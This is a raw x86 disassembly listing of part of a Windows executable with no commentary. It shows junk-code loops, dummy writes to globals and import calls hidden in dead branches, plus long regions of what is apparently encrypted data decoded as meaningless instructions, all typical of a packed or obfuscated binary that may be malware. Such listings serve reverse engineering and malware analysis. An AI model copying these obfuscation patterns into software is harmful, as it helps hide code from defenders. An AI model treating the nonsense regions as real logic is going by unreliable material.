  405086:	xor    edi,edi
  405088:	add    edi,DWORD PTR ds:0x4336ff
  40508e:	add    DWORD PTR ds:0x4336bb,edi
  405094:	mov    edi,DWORD PTR [ebp-0x10]
  405097:	sub    edi,edx
  405099:	mov    edx,DWORD PTR [ebp-0x4]
  40509c:	xor    edx,eax
  40509e:	add    edx,ecx
  4050a0:	mov    DWORD PTR ds:0x4336eb,0x78fa
  4050aa:	cmp    edi,edx
  4050ac:	mov    DWORD PTR ds:0x43373b,0x49ec
  4050b6:	jb     0x40685e
  4050bc:	mov    edx,DWORD PTR [ebp-0x28]
  4050bf:	mov    edi,DWORD PTR [ebp-0x4]
  4050c2:	xor    edx,eax
  4050c4:	inc    DWORD PTR ds:0x43373b
  4050ca:	xor    edi,eax
  4050cc:	not    DWORD PTR ds:0x4336fb
  4050d2:	add    edi,ecx
  4050d4:	add    edx,ecx
  4050d6:	adc    ebx,0x69d8
  4050dc:	imul   edx,edi
  4050df:	mov    edi,DWORD PTR [ebp-0x8]
  4050e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4050e5:	sbb    DWORD PTR ds:0x433627,0x4336b7
  4050ef:	sub    ebx,edi
  4050f1:	mov    DWORD PTR ds:0x43361f,0x4726
  4050fb:	cmp    ebx,edx
  4050fd:	mov    DWORD PTR ds:0x4336eb,0x2e42
  405107:	ja     0x4054d4
  40510d:	and    DWORD PTR ds:0x4336ff,0x0
  405117:	jmp    0x40512b
  40511c:	xor    edx,edx
  40511e:	add    edx,DWORD PTR ds:0x4336ff
  405124:	inc    edx
  405125:	mov    DWORD PTR ds:0x4336ff,edx
  40512b:	cmp    DWORD PTR ds:0x4336ff,0x17
  405132:	jae    0x40515a
  405138:	cmp    DWORD PTR ds:0x4336ff,0x18
  40513f:	jne    0x405155
  405145:	push   0x19d0
  40514a:	push   0x338d
  40514f:	call   DWORD PTR ds:0x412004
  405155:	jmp    0x40511c
  40515a:	mov    edx,DWORD PTR [ebp-0x4]
  40515d:	sbb    DWORD PTR ds:0x4336eb,0x43366f
  405167:	xor    edx,eax
  405169:	xor    DWORD PTR ds:0x4336e7,0x55d1
  405173:	jmp    0x4054cd
  405178:	cdq    
  405179:	jp     0x4051e8
  40517b:	pushf  
  40517c:	ins    DWORD PTR es:[edi],dx
  40517d:	imul   ebp,DWORD PTR [ecx+0x7b],0x879a2b7f
  405184:	aaa    
  405185:	jb     0x405134
  405187:	cmp    dh,ah
  405189:	sub    BYTE PTR [esi+0x7e],bh
  40518c:	xor    edi,DWORD PTR [ebp+0x7e]
  40518f:	jle    0x4051fa
  405191:	jmp    0xcd6d7bd
  405196:	push   cs
  405197:	mov    dl,0x99
  405199:	adc    ecx,DWORD PTR [edi+0x61d2964f]
  40519f:	xlat   BYTE PTR ds:[ebx]
  4051a0:	data16 jecxz 0x4051c7
  4051a3:	aad    0xf8
  4051a5:	xor    DWORD PTR [esi],0xffffff9e
  4051a8:	cmp    DWORD PTR [ebx+0x55521301],ebx
  4051ae:	std    
  4051af:	icebp  
  4051b0:	inc    ebx
  4051b1:	mov    DWORD PTR [ebx+ebx*2],esp
  4051b4:	fwait
  4051b5:	xor    BYTE PTR [ebp-0x79d33bb7],dl
  4051bb:	cli    
  4051bc:	xchg   ebp,eax
  4051bd:	out    0xc8,al
  4051bf:	cmp    al,0xa8
  4051c1:	iret   
  4051c2:	idiv   BYTE PTR [eax]
  4051c4:	cmp    DWORD PTR [ebx+0x5ed3ed88],edx
  4051ca:	mov    ebp,0x27e1fb8d
  4051cf:	(bad)  
  4051d0:	push   edx
  4051d1:	std    
  4051d2:	int3   
  4051d3:	scas   eax,DWORD PTR es:[edi]
  4051d4:	neg    BYTE PTR [ebp-0x35]
  4051d7:	dec    edi
  4051d8:	adc    ah,al
  4051da:	dec    eax
  4051db:	pushf  
  4051dc:	mov    eax,0x73461c2a
  4051e1:	and    dl,BYTE PTR [ebx+0xb9af0ec]
  4051e7:	mov    ch,0xe2
  4051e9:	jecxz  0x4051d6
  4051eb:	in     al,dx
  4051ec:	aaa    
  4051ed:	stos   DWORD PTR es:[edi],eax
  4051ee:	dec    ecx
  4051ef:	pop    edx
  4051f0:	shr    BYTE PTR [ebp+0x20],cl
  4051f3:	sbb    BYTE PTR [ebx+ebx*2+0xf94aa0],0x30
  4051fb:	mov    bl,0xb5
  4051fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051ff:	fadd   QWORD PTR [ecx]
  405201:	(bad)  
  405202:	nop
  405203:	retf   0xf7cf
  405206:	ror    BYTE PTR [eax],cl
  405208:	pop    esp
  405209:	(bad)  
  40520a:	mov    ds:0xb61ebbf6,al
  40520f:	fwait
  405210:	jb     0x40522f
  405212:	mov    ds:0x5d2ce1bf,al
  405217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405218:	(bad)  
  405219:	jmp    0xb377:0xd541218a
  405220:	or     BYTE PTR [esi+0x50],ah
  405223:	loopne 0x4051ad
  405225:	test   eax,0xb4715a65
  40522a:	jns    0x40529b
  40522c:	xor    DWORD PTR [ecx-0x20],eax
  40522f:	(bad)  
  405230:	les    ebp,FWORD PTR [edx]
  405232:	mov    esi,0x6b97555
  405237:	add    al,0x8c
  405239:	adc    BYTE PTR [edx+0x3],ah
  40523c:	out    0x6,al
  40523e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40523f:	icebp  
  405240:	sbb    al,0xe7
  405242:	push   eax
  405243:	call   0x892f:0x7dd72f5d
  40524a:	std    
  40524b:	loope  0x405223
  40524d:	jle    0x40524b
  40524f:	add    eax,0xe4a73751
  405254:	and    esp,DWORD PTR [edi+0xd767da9]
  40525a:	call   0xfa75:0x787be695
  405261:	xchg   edi,eax
  405262:	dec    esi
  405263:	sbb    eax,DWORD PTR [edx-0x14c334c3]
  405269:	in     al,dx
  40526a:	fisttp DWORD PTR [edi+0x57]
  40526d:	ds leave 
  40526f:	out    dx,eax
  405270:	arpl   WORD PTR [esp+ebx*4],cx
  405273:	rcr    BYTE PTR [edx-0x5d],1
  405276:	push   0x2f1f3c98
  40527b:	mov    ah,0x3c
  40527d:	sub    esp,esi
  40527f:	cmp    edi,esi
  405281:	mov    ebp,0x40f7b3ff
  405286:	pusha  
  405287:	mov    ah,0x8a
  405289:	es retf 0x938a
  40528d:	jae    0x40526a
  40528f:	jecxz  0x4052dc
  405291:	pop    eax
  405292:	push   es
  405293:	pop    ecx
  405294:	arpl   WORD PTR [ebx-0x6ceb126f],di
  40529a:	pop    es
  40529b:	pop    esi
  40529c:	(bad)  
  40529d:	mov    edx,0xe75cb152
  4052a2:	mov    eax,ds:0xdb23bb85
  4052a7:	fneni(8087 only) 
  4052a9:	xchg   edi,eax
  4052aa:	dec    esp
  4052ab:	sub    al,0xa5
  4052ad:	and    DWORD PTR [edx+0x46],eax
  4052b0:	fidivr DWORD PTR [ecx]
  4052b2:	mov    eax,ds:0xcf116229
  4052b7:	mov    esi,?
  4052b9:	mov    ebx,0xc6052f49
  4052be:	cs cmp eax,0x9df87dea
  4052c4:	xor    eax,0x950ac8d3
  4052c9:	repnz adc eax,0xde304ee7
  4052cf:	cli    
  4052d0:	mov    al,ds:0x7698a9d
  4052d5:	rcr    DWORD PTR [ecx],0xaf
  4052d8:	mov    ?,WORD PTR [ecx]
  4052da:	loope  0x40533e
  4052dc:	pop    ss
  4052dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052de:	pop    edx
  4052df:	popf   
  4052e0:	add    dh,bl
  4052e2:	push   0x3e
  4052e4:	icebp  
  4052e5:	adc    DWORD PTR [ebp-0x73],ebx
  4052e8:	mov    al,0x5b
  4052ea:	pop    esi
  4052eb:	ret    0xf8f2
  4052ee:	data16 aas 
  4052f0:	dec    esi
  4052f1:	int    0xe
  4052f3:	xor    dl,dl
  4052f5:	sbb    BYTE PTR [edx],dl
  4052f7:	and    DWORD PTR [edx-0x11d76f1a],esp
  4052fd:	ds mov dl,0x9e
  405300:	and    BYTE PTR [ebp+esi*4-0x34],dl
  405304:	inc    esi
  405305:	rcl    ch,0xee
  405308:	int    0x6d
  40530a:	xchg   esp,eax
  40530b:	adc    ebx,DWORD PTR [edi+esi*4]
  40530e:	cmp    ch,BYTE PTR cs:[bx+di]
  405312:	retf   
  405313:	ret    0xbc59
  405316:	jp     0x405373
  405318:	scas   eax,DWORD PTR es:[edi]
  405319:	test   eax,0x44290774
  40531e:	pop    ecx
  40531f:	bound  ebp,QWORD PTR [edx+0x7a716011]
  405325:	pop    es
  405326:	test   al,bl
  405328:	pop    ebp
  405329:	xor    eax,0x5f1b8eed
  40532e:	add    DWORD PTR [edx-0x7e21f0c6],0x77
  405335:	int3   
  405336:	out    dx,al
  405337:	add    bl,BYTE PTR [eax]
  405339:	push   ds
  40533a:	cmp    BYTE PTR [esi+esi*8+0x29],ah
  40533e:	pop    eax
  40533f:	dec    ebx
  405340:	pop    ds
  405341:	dec    DWORD PTR [ebx+0x54ea1429]
  405347:	in     al,dx
  405348:	xor    bh,BYTE PTR [esi+0x1fd00c07]
  40534e:	inc    edx
  40534f:	inc    esi
  405350:	aaa    
  405351:	jnp    0x4053a6
  405353:	mov    edx,0xf6dbb087
  405358:	es and dh,ch
  40535b:	xchg   esp,eax
  40535c:	mov    bl,0x79
  40535e:	aaa    
  40535f:	test   BYTE PTR [esi],dl
  405361:	mov    dh,BYTE PTR [esp+eiz*4-0x3088c6ac]
  405368:	cld    
  405369:	(bad)  [edi-0x4f]
  40536c:	mov    eax,0x4991df42
  405371:	ins    DWORD PTR es:[edi],dx
  405372:	fs push ss
  405374:	mov    ah,0x8e
  405376:	adc    ebp,DWORD PTR [eax-0x3d]
  405379:	mov    edi,0xf2326510
  40537e:	das    
  40537f:	sbb    bl,BYTE PTR [edx+0x4ec9de8]
  405385:	je     0x4053fd
  405387:	(bad)  
  405388:	mov    cl,0xeb
  40538a:	xchg   edi,eax
  40538b:	std    
  40538c:	pushf  
  40538d:	stos   BYTE PTR es:[edi],al
  40538e:	mov    BYTE PTR [esi-0x1d6682dc],bl
  405394:	aam    0x4b
  405396:	jg     0x4053cc
  405398:	dec    esp
  405399:	lahf   
  40539a:	punpckhwd mm7,QWORD PTR [eax+0x53fcfe48]
  4053a1:	aad    0xdd
  4053a3:	out    0xd9,eax
  4053a5:	aam    0xa8
  4053a7:	mov    edx,0x339aca54
  4053ac:	push   eax
  4053ad:	cs dec ecx
  4053af:	loop   0x405400
  4053b1:	xchg   esi,eax
  4053b2:	push   ebx
  4053b3:	aam    0x6
  4053b5:	lods   eax,DWORD PTR ds:[esi]
  4053b6:	jbe    0x405407
  4053b8:	sub    al,0xd5
  4053ba:	dec    ebx
  4053bb:	rol    DWORD PTR [ebx+0x5a],cl
  4053be:	test   DWORD PTR [eax+0x519123ba],0x5cd85ec7
  4053c8:	jb     0x405386
  4053ca:	jle    0x40536b
  4053cc:	pop    ecx
  4053cd:	and    eax,0xdbdb9e5f
  4053d2:	lock add al,0xe9
  4053d5:	pop    ebp
  4053d6:	loop   0x405424
  4053d8:	rol    BYTE PTR [ecx-0x27],1
  4053db:	stos   BYTE PTR es:[edi],al
  4053dc:	pushf  
  4053dd:	mov    DWORD PTR [esi],ebx
  4053df:	mov    cs,WORD PTR [eax-0x49]
  4053e2:	test   eax,0x946c9cf4
  4053e7:	loop   0x405381
  4053e9:	or     eax,DWORD PTR [ebx-0x47ee0e30]
  4053ef:	xor    al,bl
  4053f1:	push   eax
  4053f2:	iret   
  4053f3:	lock push 0xffffff86
  4053f6:	xchg   ecx,eax
  4053f7:	push   esi
  4053f8:	xor    ebp,DWORD PTR [eax+0x52]
  4053fb:	lock hlt 
  4053fd:	test   DWORD PTR [ecx-0x5d2e9fa8],ecx
  405403:	test   BYTE PTR [edi+0x35],al
  405406:	mov    bh,BYTE PTR [eax-0x3]
  405409:	retf   
  40540a:	mov    ah,0x65
  40540c:	cmp    eax,ebp
  40540e:	retf   
  40540f:	addr16 ret 
  405411:	outs   dx,DWORD PTR ds:[esi]
  405412:	nop
  405413:	arpl   WORD PTR [edi+edx*2],sp
  405416:	add    BYTE PTR ds:0x75e9dc07,0x54
  40541d:	arpl   WORD PTR [eax+edx*4-0x7e0f9d78],cx
  405424:	add    cl,ah
  405426:	sub    BYTE PTR ds:0xf8283264,dl
  40542c:	dec    esp
  40542d:	or     al,0xda
  40542f:	xchg   DWORD PTR [eax+0x300e5a84],eax
  405435:	shl    ebx,cl
  405437:	jb     0x405439
  405439:	lea    edx,[ecx]
  40543b:	pop    esp
  40543c:	les    ebp,FWORD PTR [ebx]
  40543e:	(bad)
  405441:	adc    cl,BYTE PTR [ebx+0xbeb4cd]
  405447:	aas    
  405448:	mov    esi,0x9fe75d3d
  40544d:	and    BYTE PTR [esi],cl
  40544f:	mov    BYTE PTR [edx+0x521d0352],dh
  405455:	push   esi
  405456:	outs   dx,DWORD PTR ds:[esi]
  405457:	and    cl,dl
  405459:	pop    es
  40545a:	mov    eax,0xb4db82f9
  40545f:	jae    0x4053e6
  405461:	sbb    bh,BYTE PTR [ebx+0x70]
  405464:	outs   dx,BYTE PTR ds:[esi]
  405465:	xchg   ebx,eax
  405466:	sub    eax,0x136503b1
  40546b:	pop    ebx
  40546c:	inc    esi
  40546d:	jl     0x40546d
  40546f:	mov    esi,0xf2fc5fc0
  405474:	lods   al,BYTE PTR ds:[esi]
  405475:	fwait
  405476:	inc    ecx
  405477:	xchg   ecx,eax
  405478:	push   ds
  405479:	arpl   WORD PTR [ecx-0xf8cdcd2],dx
  40547f:	sti    
  405480:	popf   
  405481:	sbb    DWORD PTR [ebx],ecx
  405483:	or     bh,BYTE PTR [ecx-0x29d9a725]
  405489:	jbe    0x4054ef
  40548b:	dec    esp
  40548c:	xor    eax,DWORD PTR [eax+0x2a]
  40548f:	(bad)  
  405490:	aad    0x86
  405492:	push   esi
  405493:	fs (bad) 
  405495:	mov    bl,0x4f
  405497:	cmp    eax,DWORD PTR [edx]
  405499:	unpckhps xmm3,XMMWORD PTR [ecx-0x4f45b18d]
  4054a0:	ins    DWORD PTR es:[edi],dx
  4054a1:	inc    eax
  4054a2:	call   0xc478:0x3c01fe66
  4054a9:	or     eax,0xc76aa92a
  4054ae:	sbb    BYTE PTR [edi+edx*2-0x7bc9b238],0x9f
  4054b6:	sub    eax,0x738121f
  4054bb:	add    ecx,DWORD PTR [ebp-0x33]
  4054be:	sub    DWORD PTR [esp+edx*4+0x23],0xe5797b3d
  4054c6:	outs   dx,DWORD PTR ds:[esi]
  4054c7:	inc    edx
  4054c8:	add    al,0xee
  4054cb:	mov    ah,0xea
  4054cd:	add    edx,ecx
  4054cf:	jmp    0x4063ea
  4054d4:	mov    edx,DWORD PTR [ebp-0x2c]
  4054d7:	mov    edi,DWORD PTR [ebp-0x4]
  4054da:	xor    edx,eax
  4054dc:	movzx  ebx,BYTE PTR ds:0x4336e7
  4054e3:	or     DWORD PTR ds:0x433703,ebx
  4054e9:	xor    edi,eax
  4054eb:	and    DWORD PTR ds:0x4336f3,0x0
  4054f5:	xor    ebx,ebx
  4054f7:	add    ebx,DWORD PTR ds:0x4336f3
  4054fd:	inc    ebx
  4054fe:	mov    DWORD PTR ds:0x4336f3,ebx
  405504:	cmp    DWORD PTR ds:0x4336f3,0x6
  40550b:	jne    0x40552b
  405511:	push   0x1804
  405516:	push   0x80d8
  40551b:	push   0x74bc
  405520:	push   0x5a14
  405525:	call   DWORD PTR ds:0x412370
  40552b:	cmp    DWORD PTR ds:0x4336f3,0x5
  405532:	jne    0x405545
  405538:	mov    ebx,DWORD PTR ds:0x4336f3
  40553e:	inc    ebx
  40553f:	mov    DWORD PTR ds:0x4336f3,ebx
  405545:	cmp    DWORD PTR ds:0x4336f3,0x1e
  40554c:	jb     0x4054f5
  405552:	mov    DWORD PTR ds:0x4336f7,0x387c
  40555c:	add    edi,ecx
  40555e:	add    edx,ecx
  405560:	imul   edx,edi
  405563:	mov    edi,DWORD PTR [ebp-0x8]
  405566:	and    DWORD PTR ds:0x4336b7,0x0
  405570:	mov    ebx,DWORD PTR ds:0x4336b7
  405576:	inc    ebx
  405577:	mov    DWORD PTR ds:0x4336b7,ebx
  40557d:	cmp    DWORD PTR ds:0x4336b7,0x2c
  405584:	jne    0x4055b0
  40558a:	push   DWORD PTR [ebp-0x28]
  40558d:	push   0x7933
  405592:	push   0x433846
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x24]
  40559d:	push   DWORD PTR [ebp-0x1c]
  4055a0:	push   0x42e0
  4055a5:	push   0x392f
  4055aa:	call   DWORD PTR ds:0x412374
  4055b0:	cmp    DWORD PTR ds:0x4336b7,0x1e
  4055b7:	jb     0x405570
  4055bd:	mov    ebx,DWORD PTR [ebp-0x10]
  4055c0:	sub    ebx,edi
  4055c2:	cmp    ebx,edx
  4055c4:	ja     0x4055d2
  4055ca:	mov    edx,DWORD PTR [ebp-0x28]
  4055cd:	jmp    0x4063dc
  4055d2:	mov    edx,DWORD PTR [ebp-0x30]
  4055d5:	mov    edi,DWORD PTR [ebp-0x4]
  4055d8:	xor    edx,eax
  4055da:	xor    edi,eax
  4055dc:	add    edi,ecx
  4055de:	add    edx,ecx
  4055e0:	imul   edx,edi
  4055e3:	mov    edi,DWORD PTR [ebp-0x8]
  4055e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4055e9:	sub    ebx,edi
  4055eb:	cmp    ebx,edx
  4055ed:	ja     0x4055fb
  4055f3:	mov    edx,DWORD PTR [ebp-0x2c]
  4055f6:	jmp    0x4063dc
  4055fb:	mov    edx,DWORD PTR [ebp-0x34]
  4055fe:	mov    edi,DWORD PTR [ebp-0x4]
  405601:	xor    edx,eax
  405603:	xor    edi,eax
  405605:	add    edi,ecx
  405607:	add    edx,ecx
  405609:	imul   edx,edi
  40560c:	mov    edi,DWORD PTR [ebp-0x8]
  40560f:	mov    ebx,DWORD PTR [ebp-0x10]
  405612:	sub    ebx,edi
  405614:	cmp    ebx,edx
  405616:	ja     0x40597e
  40561c:	jmp    0x405976
  405621:	(bad)  [eax+0x65]
  405624:	pop    eax
  405625:	jne    0x405698
  405627:	loope  0x405672
  405629:	clc    
  40562a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562b:	dec    ebp
  40562c:	push   0x96d681ad
  405631:	test   eax,0x337e7e37
  405636:	jge    0x4056b6
  405638:	jle    0x4055fe
  40563a:	pop    si
  40563c:	popa   
  40563d:	out    dx,eax
  40563e:	pop    ecx
  40563f:	dec    esi
  405640:	mov    bl,0xc7
  405642:	fidiv  WORD PTR [esi]
  405644:	jp     0x40566b
  405646:	outs   dx,DWORD PTR ds:[esi]
  405647:	or     eax,0x2879f825
  40564c:	or     al,0xea
  40564e:	sbb    dh,BYTE PTR [eax+0x4a894c1f]
  405654:	sub    DWORD PTR [ebp-0x3],ebp
  405657:	adc    BYTE PTR [ecx+0x6edd100c],cl
  40565d:	mov    bl,0xdc
  40565f:	add    BYTE PTR [ecx-0x7762f873],al
  405665:	add    cl,dh
  405667:	push   0xda029340
  40566c:	ret    0x2e8
  40566f:	mov    ebx,0x95c18c91
  405674:	sbb    al,0x41
  405676:	inc    ebx
  405677:	mov    edx,0x12857bc4
  40567c:	pop    edi
  40567d:	lods   al,BYTE PTR ds:[esi]
  40567e:	pop    ss
  40567f:	xchg   DWORD PTR [ebx+0x72],ebx
  405682:	repz cmps DWORD PTR es:[esi],DWORD PTR es:[edi]
  405685:	scas   eax,DWORD PTR es:[edi]
  405686:	(bad)  
  405687:	xor    ah,ch
  405689:	pop    ss
  40568a:	pop    ebx
  40568b:	(bad)  
  40568c:	mov    esi,0x48a34692
  405691:	into   
  405692:	lods   al,BYTE PTR ds:[esi]
  405693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405694:	ja     0x40565f
  405696:	mov    esi,0x66cf8043
  40569b:	shl    DWORD PTR [edi+0x77eb0de5],cl
  4056a1:	push   ecx
  4056a2:	loope  0x405710
  4056a4:	sar    ch,0x13
  4056a7:	dec    eax
  4056a8:	(bad)  
  4056a9:	aad    0x4c
  4056ab:	sbb    BYTE PTR [edi-0x37ba4ce8],0xa
  4056b2:	out    dx,al
  4056b3:	sub    eax,0x23c9ad38
  4056b8:	icebp  
  4056b9:	push   ecx
  4056ba:	push   ss
  4056bb:	loope  0x40570f
  4056bd:	and    al,0x8b
  4056bf:	sbb    al,BYTE PTR [eax]
  4056c1:	push   cs
  4056c2:	rcl    DWORD PTR [eax],0x14
  4056c5:	add    ah,bl
  4056c7:	into   
  4056c8:	jl     0x4056e2
  4056ca:	mov    cl,0x3f
  4056cc:	push   ebx
  4056cd:	inc    esi
  4056ce:	daa    
  4056cf:	jb     0x4056bc
  4056d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056d2:	jmp    0x58a2c495
  4056d7:	shl    BYTE PTR [ecx+ecx*4+0xb],1
  4056db:	cli    
  4056dc:	ret    0x476b
  4056df:	in     al,dx
  4056e0:	push   ecx
  4056e1:	ret    0x1b99
  4056e4:	cli    
  4056e5:	mov    DWORD PTR [ebx],ecx
  4056e7:	inc    esp
  4056e8:	pop    ebx
  4056e9:	stos   DWORD PTR es:[edi],eax
  4056ea:	lea    ecx,[ebx]
  4056ec:	jmp    0x27f5:0x5ccabd5f
  4056f3:	push   ebx
  4056f4:	aaa    
  4056f5:	push   ebp
  4056f6:	sti    
  4056f7:	scas   al,BYTE PTR es:[edi]
  4056f8:	jmp    0xda77e99a
  4056fd:	test   BYTE PTR [ebx],cl
  4056ff:	push   0xaf6110d4
  405704:	js     0x4056a1
  405706:	mov    ebp,0xfa5f1c9e
  40570b:	enter  0x6733,0x16
  40570f:	mov    bh,0x77
  405711:	outs   dx,DWORD PTR ds:[esi]
  405712:	sbb    DWORD PTR [ecx+ebp*2],esi
  405715:	(bad)  
  405716:	jp     0x4056dc
  405718:	pop    eax
  405719:	inc    eax
  40571a:	pusha  
  40571b:	pop    ebx
  40571c:	addr16 push 0x1117250d
  405722:	or     eax,0xb882b38
  405727:	iret   
  405728:	fs mov al,0x17
  40572b:	fidivr DWORD PTR [ecx-0x34f44864]
  405731:	(bad)  
  405732:	dec    edx
  405733:	loop   0x405764
  405735:	add    eax,0x61a59eff
  40573a:	in     al,0x2c
  40573c:	sbb    DWORD PTR [ecx-0x4b],ecx
  40573f:	test   dh,ch
  405741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405742:	scas   eax,DWORD PTR es:[edi]
  405743:	dec    eax
  405744:	arpl   WORD PTR [ebx-0x4175ba3b],ax
  40574a:	pop    edi
  40574b:	retf   
  40574c:	mov    ds:0x540c5eea,al
  405751:	mov    ah,0x32
  405753:	pop    es
  405754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405755:	inc    ebx
  405756:	leave  
  405757:	dec    DWORD PTR gs:[ebx+ebp*1-0x76]
  40575c:	xchg   ebp,eax
  40575d:	cmc    
  40575e:	mov    WORD PTR es:[ecx],es
  405761:	mov    dh,BYTE PTR [ebx]
  405763:	add    eax,0xb137dec2
  405768:	or     ah,BYTE PTR [eax-0x7b4c0dd3]
  40576e:	inc    esi
  40576f:	pop    ebx
  405770:	lds    esp,FWORD PTR [ebx-0x6a]
  405773:	push   0x83f126e1
  405778:	popa   
  405779:	pop    ecx
  40577a:	enter  0xd9f7,0xf3
  40577e:	or     DWORD PTR [eax-0x27],edx
  405781:	or     eax,0x8dcc0c8a
  405786:	add    esi,DWORD PTR [esi+edi*4-0x73]
  40578a:	push   cs
  40578b:	xchg   DWORD PTR [edx-0x78a42c],esp
  405791:	mov    edi,0xb803a2fd
  405796:	sub    eax,DWORD PTR [ecx-0x75206472]
  40579c:	adc    cl,BYTE PTR [ecx]
  40579e:	pop    eax
  40579f:	cmp    ah,BYTE PTR [esi-0x3f8f660b]
  4057a5:	outs   dx,BYTE PTR ds:[esi]
  4057a6:	fcomip st,st(4)
  4057a8:	inc    ebp
  4057a9:	inc    ebx
  4057aa:	xchg   ecx,eax
  4057ab:	jecxz  0x4057b5
  4057ad:	mov    esi,0x26c92541
  4057b2:	pop    edx
  4057b3:	retf   0xcd08
  4057b6:	xor    DWORD PTR [ebp-0x3c51ee56],esi
  4057bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057bd:	aam    0xd9
  4057bf:	and    eax,0xf9132c36
  4057c4:	stc    
  4057c5:	mov    ss,WORD PTR [ebp-0x3455d4fa]
  4057cb:	push   eax
  4057cc:	xlat   BYTE PTR ds:[ebx]
  4057cd:	push   cs
  4057ce:	in     eax,dx
  4057cf:	std    
  4057d0:	mov    es,WORD PTR [ecx-0xe4016]
  4057d6:	dec    eax
  4057d7:	mov    edi,edi
  4057d9:	popa   
  4057da:	inc    esi
  4057db:	sar    DWORD PTR [ecx-0x51a4339d],1
  4057e1:	out    dx,al
  4057e2:	or     esi,DWORD PTR [edi+0x2b51194a]
  4057e8:	int3   
  4057e9:	sub    ebx,DWORD PTR [eax-0x5d]
  4057ec:	push   0x77
  4057ee:	shr    DWORD PTR [esi-0x13],cl
  4057f1:	or     BYTE PTR [eax+ecx*8+0x709cadcb],ch
  4057f8:	mov    esi,0xa3ec2f82
  4057fd:	imul   ecx,DWORD PTR [bx],0x2e8fd95
  405804:	das    
  405805:	imul   ecx,esp,0xb
  405808:	cld    
  405809:	icebp  
  40580a:	jmp    0xe7890a3e
  40580f:	inc    eax
  405810:	ficom  DWORD PTR [edx-0x3d0d9df]
  405816:	mov    esp,DWORD PTR [edx-0x2f]
  405819:	mov    al,ds:0xbe3b6ea8
  40581e:	daa    
  40581f:	inc    edx
  405820:	(bad)  
  405821:	ror    edi,cl
  405823:	sti    
  405824:	dec    eax
  405825:	sbb    DWORD PTR ss:[eax],eax
  405828:	or     DWORD PTR ds:0xb91078a3,esi
  40582e:	xor    ch,BYTE PTR ds:[ebx+ebp*4-0x13]
  405833:	add    eax,0xff531cdb
  405838:	jne    0x405821
  40583a:	mov    esi,0x698f3698
  40583f:	mov    esi,0x5d310cdd
  405844:	sub    ecx,ebp
  405846:	fistp  WORD PTR [esi]
  405848:	ja     0x4058b8
  40584a:	jae    0x40584a
  40584c:	pop    edi
  40584d:	jmp    0xdb4a83a6
  405852:	je     0x405897
  405854:	mov    esp,0x5e8d6e43
  405859:	imul   esi,DWORD PTR [ecx+0x133b53f4],0xdf65d168
  405863:	loope  0x4058dd
  405865:	dec    esp
  405866:	mov    edi,0xedd8c77f
  40586b:	sbb    edx,DWORD PTR [edi]
  40586d:	sub    DWORD PTR [ebp+0x1e1770b6],esp
  405873:	and    al,0xe5
  405875:	bound  ebx,QWORD PTR [esp+ebp*4]
  405878:	lahf   
  405879:	xor    DWORD PTR [esi+0x62],esi
  40587c:	test   al,0x9a
  40587e:	(bad)  
  40587f:	ins    BYTE PTR es:[edi],dx
  405880:	add    bl,BYTE PTR [edx-0x3186db59]
  405886:	fst    QWORD PTR [esi+0x16]
  405889:	mov    ds:0xe5aeef7,eax
  40588e:	loope  0x40585d
  405890:	inc    ecx
  405891:	(bad)  
  405893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405894:	jnp    0x40588a
  405896:	dec    esp
  405897:	ja     0x405854
  405899:	push   edi
  40589a:	outs   dx,BYTE PTR ds:[esi]
  40589b:	xor    al,0x65
  40589d:	mov    ch,0x69
  40589f:	or     ah,bl
  4058a1:	in     eax,dx
  4058a2:	sub    al,0x97
  4058a4:	lods   al,BYTE PTR ds:[esi]
  4058a5:	out    dx,eax
  4058a6:	sar    DWORD PTR [edx+0x6fd28c02],1
  4058ac:	retf   
  4058ad:	fcom   st(3)
  4058af:	dec    edi
  4058b0:	xor    al,0x8c
  4058b2:	int3   
  4058b3:	ins    DWORD PTR es:[edi],dx
  4058b4:	nop
  4058b5:	cld    
  4058b6:	mov    edx,0x75cc3d69
  4058bb:	mov    edi,0x805deab5
  4058c0:	or     ch,ch
  4058c2:	mov    bl,0xf7
  4058c4:	mov    ds:0xec43ce80,eax
  4058c9:	cs pop eax
  4058cb:	(bad)  
  4058cc:	cmc    
  4058cd:	repnz adc BYTE PTR [edi+esi*2-0x7d],dh
  4058d2:	mov    cl,0x65
  4058d4:	adc    ch,0x67
  4058d7:	pop    ss
  4058d8:	hlt    
  4058d9:	in     eax,dx
  4058da:	fild   QWORD PTR [ebp-0x7a]
  4058dd:	fcomp  QWORD PTR [ecx-0x6c4ac4c7]
  4058e3:	mov    ch,0xbb
  4058e5:	rcr    DWORD PTR [edx-0x9],cl
  4058e8:	sbb    al,0xde
  4058ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058eb:	das    
  4058ec:	cmp    BYTE PTR [edi-0x22],ch
  4058ef:	sub    BYTE PTR [edi+0x2826dfe7],bh
  4058f5:	and    edx,0x34
  4058f8:	lds    edx,FWORD PTR [esi+0x54fb4917]
  4058fe:	es loopne 0x4058b3
  405901:	repz jmp 0x405983
  405904:	inc    edx
  405905:	jle    0x405950
  405907:	aad    0x7c
  405909:	push   0x472c675c
  40590e:	shl    DWORD PTR [edx-0xd],0xde
  405912:	addr16 pop ds
  405914:	nop
  405915:	dec    edi
  405916:	sbb    eax,0xf7bffd90
  40591b:	mov    ah,0x13
  40591d:	lock clc 
  40591f:	sbb    al,0x7e
  405921:	dec    edx
  405922:	test   eax,0xb7fa505c
  405927:	(bad)  
  405928:	ror    cl,1
  40592a:	mov    dh,0x98
  40592c:	jns    0x4058ba
  40592e:	xchg   BYTE PTR [edi-0x80],dh
  405931:	mov    ch,dh
  405933:	sbb    ch,0xe3
